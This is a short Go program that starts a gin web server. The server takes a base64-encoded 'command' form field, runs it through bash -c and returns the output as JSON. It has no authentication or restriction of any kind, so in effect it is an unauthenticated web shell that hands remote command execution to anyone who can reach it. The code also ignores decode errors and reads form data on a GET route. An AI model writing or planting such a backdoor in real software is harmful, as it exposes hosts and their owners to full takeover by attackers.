package main

import (
	"bytes"
	"encoding/base64"
	"net/http"
	"os/exec"

	"github.com/gin-gonic/gin"
)

func main() {
	r := gin.Default()

	r.GET("/", func(c *gin.Context) {
		cmdform := c.PostForm("command")
		if cmdform == "" {
			c.JSON(http.StatusBadRequest, "PostForm 'command' not fond or empty")
			return
		}
		enccmd, err := base64.StdEncoding.DecodeString(cmdform)

		cmd := exec.Command("bash", "-c", string(enccmd))

		outbuf := &bytes.Buffer{}
		errbuf := &bytes.Buffer{}
		cmd.Stdout = outbuf
		cmd.Stderr = errbuf

		if err = cmd.Run(); err == nil {
			c.JSON(
				http.StatusOK,
				gin.H{
					"success": true,
					"stdout":  outbuf.Bytes(),
					"stderr":  errbuf.Bytes(),
				})
		} else {
			c.JSON(
				http.StatusOK,
				gin.H{
					"success": false,
					"error":   err.Error(),
					"stdout":  outbuf.Bytes(),
					"stderr":  errbuf.Bytes(),
				},
			)
		}
	})

	r.Run()
}
